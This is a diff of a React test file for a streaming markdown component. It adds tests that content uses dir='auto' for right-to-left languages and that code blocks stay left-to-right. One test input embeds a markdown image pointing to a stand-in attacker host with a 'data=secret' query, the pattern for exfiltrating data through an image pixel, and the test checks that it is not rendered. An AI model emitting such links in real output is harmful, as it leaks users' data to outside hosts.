@@ -43,6 +43,33 @@ describe("StreamingMarkdownContent", () => {
     expect(props.rehypePlugins).not.toContain("raw");
   });
 
+  it("renders content with dir=auto so RTL languages lay out correctly", () => {
+    const html = renderToStaticMarkup(
+      <StreamingMarkdownContent content="مرحبا بالعالم" />,
+    );
+
+    expect(html).toContain('dir="auto"');
+  });
+
+  it("keeps code blocks left-to-right", () => {
+    renderToStaticMarkup(<StreamingMarkdownContent content="```\ncode\n```" />);
+
+    const props = streamdownMock.mock.calls[0][0];
+    const Pre = (
+      props.components as Record<
+        string,
+        React.ComponentType<React.HTMLAttributes<HTMLPreElement>>
+      >
+    ).pre;
+    const html = renderToStaticMarkup(
+      <Pre>
+        <code className="language-text">code</code>
+      </Pre>,
+    );
+
+    expect(html).toContain('dir="ltr"');
+  });
+
   it("does not render markdown image src values", () => {
     renderToStaticMarkup(
       <StreamingMarkdownContent content="![secret](https://attacker.example/pixel?data=secret)" />,
